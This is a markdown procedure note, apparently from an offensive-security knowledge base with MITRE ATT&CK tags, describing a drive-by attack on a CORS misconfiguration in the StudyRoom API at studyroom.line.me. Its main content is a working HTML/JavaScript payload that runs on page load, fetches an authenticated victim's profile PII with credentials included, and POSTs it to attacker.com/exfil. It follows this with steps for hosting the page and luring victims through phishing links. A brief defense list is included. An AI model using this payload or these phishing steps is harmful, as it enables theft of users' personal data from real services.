---
tags:
  - exfiltration
  - phishing
  - javascript
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:25:18.018Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 148a8dca-cd4b-4746-905c-d7772884c3c2
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Craft-Malicious-Webpage-for-PII-Exfiltration

## Summary

This procedure creates a malicious HTML webpage that, when visited by an authenticated victim, uses JavaScript to make cross-origin requests to the vulnerable API and exfiltrate PII to the attacker's server.

## Description

Leveraging the CORS misconfiguration, the page loads silently fetches profile data and sends it via POST to an attacker-controlled endpoint. This simulates a drive-by compromise where victims are tricked via links (e.g., phishing).

## Requirements

1. Hosting for the malicious page (e.g., GitHub Pages or local server)
2. Attacker server for receiving exfiltrated data (e.g., webhook)
3. Victim must visit while authenticated to StudyRoom

## Defense

Defensive measures and detection strategies:

- Educate users on phishing links
- Implement Content Security Policy (CSP) to restrict fetches
- Monitor for unexpected outbound requests from browsers

## Objectives

1. Trick victim into loading the page
2. Steal PII via API call
3. Exfiltrate to attacker

## Instructions

### Step 1: Create the Malicious HTML File

**Context**: Write HTML with JS to fetch and send data.

Create index.html:

```html
<!DOCTYPE html><html><body><script>fetch('https://studyroom.line.me/api/profile', {credentials: 'include'}).then(r => r.json()).then(data => fetch('https://attacker.com/exfil', {method: 'POST', body: JSON.stringify(data)}));</script></body></html>
```

> This script runs on load, fetching profile and posting to attacker endpoint.

### Step 2: Host and Distribute

**Context**: Serve the page and lure victims.

Host on a server and share URL via email/social. Expected: On visit, data sent to /exfil endpoint.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Exfiltration]]
- [[Phishing]]
- [[JavaScript]]
